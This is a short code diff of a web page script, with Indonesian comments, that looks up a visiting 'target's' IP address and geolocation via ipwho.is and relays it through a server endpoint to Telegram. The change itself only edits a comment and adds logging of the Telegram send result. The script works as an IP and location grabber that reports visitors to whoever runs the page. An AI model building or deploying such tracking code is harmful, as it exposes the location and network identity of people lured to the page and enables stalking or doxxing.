@@ -11,7 +11,7 @@
   <script>
     async function getIP() {
       try {
-        // Ambil IP target & geolocation langsung dari ipwho.is
+        // Ambil IP target & geolocation dari ipwho.is
         const res = await fetch("https://ipwho.is/");
         const data = await res.json();
 
@@ -32,11 +32,14 @@
         document.getElementById("ip-info").textContent = info;
 
         // Kirim ke server untuk dikirim ke Telegram
-        await fetch("/api/send", {
+        const sendRes = await fetch("/api/send", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ text: info })
         });
+
+        const result = await sendRes.json();
+        console.log("Telegram send result:", result);
 
       } catch (err) {
         console.error("Error:", err);
